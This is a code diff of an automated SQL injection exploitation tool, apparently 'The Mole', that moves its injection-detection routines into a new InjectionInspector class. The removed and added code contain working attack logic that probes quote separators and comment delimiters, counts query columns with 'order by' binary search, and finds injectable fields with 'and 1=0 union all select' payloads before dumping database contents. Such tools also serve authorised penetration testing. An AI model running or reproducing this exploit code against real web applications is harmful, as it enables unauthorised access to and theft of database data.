@@ -32,6 +32,7 @@ from dbdump import DatabaseDump
 from threader import Threader
 from output import BlindSQLIOutput
 from xmlexporter import XMLExporter
+from injectioninspector import InjectionInspector
 import connection
 import time,sys
 
@@ -99,8 +100,9 @@ class TheMole:
         self.parenthesis = 0
         self._dbms_mole = None
         self.database_dump = DatabaseDump()
+        injection_inspector = InjectionInspector()
 
-        original_request = self.get_requester().request(self.url.replace(self.wildcard, self.prefix))
+        original_request = self.requester.request(self.url.replace(self.wildcard, self.prefix))
         try:
             self.analyser.set_good_page(original_request, self.needle)
         except NeedleNotFound:
@@ -108,7 +110,7 @@ class TheMole:
             return
 
         try:
-            self._find_separator()
+            self.separator, self.parenthesis = injection_inspector.find_separator(self)
         except SQLInjectionNotDetected:
             print('[-] Could not detect SQL Injection.')
             return
@@ -125,22 +127,23 @@ class TheMole:
                 print('[i] Early DBMS detection failed. Retrying later.')
 
             self.end = ''
-            req = self.get_requester().request(
-                self.generate_url(' own3d by 1')
-            )
+            req = self.make_request(' own3d by 1')
             self._syntax_error_content = self.analyser.node_content(req)
 
             try:
-                self._find_comment_delimiter()
-            except SQLInjectionNotExploitable:
+                self.comment, self.parenthesis = injection_inspector.find_comment_delimiter(self)
+                print('[+] Found comment delimiter:', self.comment)
+            except Exception:
                 print('[-] Could not exploit SQL Injection.')
                 return
 
-            self._find_column_number()
+            self.query_columns = injection_inspector.find_column_number(self)
 
             try:
-                self._find_injectable_field()
-            except SQLInjectionNotExploitable:
+                self.injectable_field = injection_inspector.find_injectable_field(self)
+                print('[+] Found injectable field:', self.injectable_field + 1)
+            except Exception as ex:
+                print(ex)
                 print('[-] Could not exploit SQL Injection.')
                 return
 
@@ -166,6 +169,10 @@ class TheMole:
         if self.verbose == True:
             print('[i] Executing query:',url)
         return url
+
+    def make_request(self, query):
+        req = self.get_requester().request(self.generate_url(query))
+        return req
 
     def get_requester(self):
         return self.requester
@@ -390,7 +397,7 @@ class TheMole:
                 length = self._dbms_mole.parse_results(self.analyser.decode(self.requester.request(
                             self.generate_url(self._dbms_mole.dbinfo_integer_len_query(self.query_columns, self.injectable_field))
                          )))
-                length = int(length)
+                length = int(length[0])
                 sqli_output = BlindSQLIOutput(length)
                 query_generator = lambda index,offset: self._dbms_mole.dbinfo_integer_query(
                                     index, self.query_columns, self.injectable_field
@@ -567,149 +574,6 @@ class TheMole:
                 print('')
             results.append(output.split(self._dbms_mole.blind_field_delimiter()))
         return results
-
-
-    def _find_separator(self):
-        separator_list = ['\'', '"', ' ']
-        equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
-        separator = None
-        for parenthesis in range(0, 3):
-            print('[i] Trying injection using',parenthesis,'parenthesis.')
-            self.parenthesis = parenthesis
-            for sep in separator_list:
-                print('[i] Trying separator: "' + sep + '"')
-                self.separator = sep
-                req = self.get_requester().request(
-                    self.generate_url(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}1')
-                )
-                if self.analyser.is_valid(req):
-                    separator = sep
-                    break
-            if separator:
-                # Validate the negation of the query
-                req = self.get_requester().request(
-                    self.generate_url(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}0')
-                )
-                if not self.analyser.is_valid(req):
-                    print('[+] Found separator: "' + self.separator + '"')
-                    return
-        if not separator:
-            raise SQLInjectionNotDetected()
-
-    def _find_comment_delimiter(self):
-        #Find the correct comment delimiter
-
-        comment_list = ['#', '--', '/*', ' ']
-        comment = None
-        for parenthesis in range(0, 3):
-            print('[i] Trying injection using',parenthesis,'parenthesis.')
-            self.parenthesis = parenthesis
-            for com in comment_list:
-                print('[i] Trying injection using comment:',com)
-                self.comment = com
-                req = self.get_requester().request(
-                    self.generate_url(' order by 1')
-                )
-                if self.analyser.node_content(req) != self._syntax_error_content and not DbmsMole.is_error(self.analyser.decode(req)):
-                    comment = com
-                    break
-            if not comment is None:
-                break
-        if comment is None:
-            self.parenthesis = 0
-            raise SQLInjectionNotExploitable()
-
-        print("[+] Found comment delimiter:", self.comment)
-
-    def _find_column_number(self):
-        #Find the number of columns of the query
-        #First get the content of needle in a wrong situation
-        req = self.get_requester().request(
-            self.generate_url(' order by 15000')
-        )
-        content_of_needle = self.analyser.node_content(req)
-
-        last = 2
-        done = False
-        new_needle_content = self.analyser.node_content(
-            self.get_requester().request(
-                self.generate_url(' order by %d ' % (last,))
-            )
-        )
-        while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
-            last *= 2
-            print('\r[i] Trying ' + str(last) + ' columns     ', end='')
-            new_needle_content = self.analyser.node_content(
-                self.get_requester().request(
-                    self.generate_url(' order by %d ' % (last,))
-                )
-            )
-        pri = last // 2
-        print('\r[i] Maximum length: ' + str(last) + '     ', end='')
-        while pri < last:
-            medio = ((pri + last) // 2) + ((pri + last) & 1)
-            print('\r[i] Trying ' + str(medio) + ' columns     ', end='')
-            new_needle_content = self.analyser.node_content(
-                self.get_requester().request(
-                    self.generate_url(' order by %d ' % (medio,))
-                )
-            )
-            if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
-                pri = medio
-            else:
-                last = medio - 1
-        self.query_columns = pri
-        print("\r[+] Found number of columns:", self.query_columns)
-
-    def _find_injectable_field_using(self, dbms_mole):
-        base = 714
-        fingers = dbms_mole.injectable_field_fingers(self.query_columns, base)
-        for finger in fingers:
-            hashes = finger.build_query()
-            to_search_hashes = finger.fingers_to_search()
-            hash_string = ",".join(hashes)
-            req = self.analyser.decode(self.get_requester().request(
-                    self.generate_url(
-                        " and 1=0 union all select " + hash_string + dbms_mole.field_finger_trailer()
-                    )
-                  ))
-            try:
-                self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
-                if len(self.injectable_fields) > 0:
-                    print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
-                    if self._filter_injectable_fields(dbms_mole, finger):
-                        self._dbms_mole = dbms_mole()
-                        self._dbms_mole.set_good_finger(finger)
-                        return True
-                    else:
-                        print('[i] Failed to inject using these fields.')
-            except Exception as ex:
-                print(ex)
-        return False
-
-    def _find_injectable_field(self):
-        if self._dbms_mole is None:
-            for mole in TheMole.dbms_mole_list:
-                print('[i] Trying DBMS', mole.dbms_name())
-                if self._find_injectable_field_using(mole):
-                    print('[+] Found DBMS:', mole.dbms_name())
-                    return
-        else:
-            if self._find_injectable_field_using(self._dbms_mole.__class__):
-                return
-        raise SQLInjectionNotExploitable()
-
-    def _filter_injectable_fields(self, dbms_mole_class, finger):
-        for field in self.injectable_fields:
-            print('[i] Trying to inject in field', field + 1)
-            query = dbms_mole_class.field_finger_query(self.query_columns, finger, field)
-            url_query = self.generate_url(query)
-            req = self.get_requester().request(url_query)
-            if dbms_mole_class.field_finger(finger) in self.analyser.decode(req):
-                self.injectable_field = field
-                print('[+] Found injectable field:', field + 1)
-                return True
-        return False
 
     def _detect_dbms_blind(self):
         for dbms_mole_class in TheMole.dbms_mole_list:
